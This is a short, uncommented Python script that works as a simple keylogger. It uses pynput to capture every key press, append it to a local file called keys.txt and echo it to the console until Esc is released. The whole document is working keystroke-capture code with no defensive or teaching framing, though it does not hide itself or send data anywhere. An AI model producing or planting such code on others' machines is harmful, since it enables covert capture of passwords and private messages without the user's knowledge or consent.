import pynput
from pynput.keyboard import *
f = open("keys.txt",'w')

def pressed(key):
    f.write(str(key))
    print(str(key))
def released(key):
    if key==Key.esc:
        return False

with Listener(on_press=pressed,on_release=released) as l:
    l.join()